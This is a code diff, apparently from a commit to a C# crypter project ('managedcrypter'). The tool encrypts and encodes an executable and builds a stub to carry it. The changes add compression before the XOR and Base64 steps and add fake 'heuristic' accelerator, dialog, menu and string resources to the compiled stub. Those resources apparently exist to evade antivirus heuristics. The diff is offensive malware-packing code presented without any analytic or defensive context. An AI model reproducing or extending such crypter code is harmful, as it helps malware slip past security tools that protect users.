@@ -3,7 +3,6 @@ using managedcrypter.IO;
 using managedcrypter.USG;
 using System;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Reflection;
@@ -20,11 +19,11 @@ namespace managedcrypter
             GenericDirectory sDirectory = null; /* stub directory */
             GenericDirectory lDirectory = null; /* lib directory */
 
-            cFile = new GenericFile("C:\\Users\\Admin\\Desktop\\Bintext.exe");
+            cFile = new GenericFile("C:\\Users\\Admin\\Desktop\\Bintext.exe", true);
             sDirectory = new GenericDirectory(@"C:\Users\admin\Desktop\managed-crypter\managedcrypter\stub");
             lDirectory = new GenericDirectory(@"C:\Users\admin\Desktop\managed-crypter\managedcrypter\lib");
 
-            /* xor -> b64 our input file */
+            /* compress -> xor -> b64 our input file */
             cFile.EncryptData();
             cFile.EncodeData();
 
@@ -91,7 +90,7 @@ namespace managedcrypter
                 if (lCompiler.CompileSource(lDirectory, cInfo))
                 {
                     Console.WriteLine("Successfully compiled library!");
-                    lFile = new GenericFile(cInfo.OutputDestination);
+                    lFile = new GenericFile(cInfo.OutputDestination, false);
                 }
             }
 
@@ -116,7 +115,7 @@ namespace managedcrypter
 
             /* encrypt our library */
             lFile.EncryptData();
-            lFile.EncodeData();     
+            lFile.EncodeData();
 
             Console.WriteLine("Sanity Check Lib: {0}", lFile.SanityCheck());
 
@@ -195,6 +194,11 @@ namespace managedcrypter
 
                 if (sCompiler.CompileSource(sDirectory, cInfo))
                     Console.WriteLine("Successfully compiled stub!");
+
+                ResourceGen.CreateHeurAcceleratorSet(cInfo.OutputDestination);      
+                ResourceGen.CreateHeurDialogSet(cInfo.OutputDestination);
+                ResourceGen.CreateHeurMenuSet(cInfo.OutputDestination);
+                ResourceGen.CreateHeurStringSet(cInfo.OutputDestination);
             }
 
             /***************************/
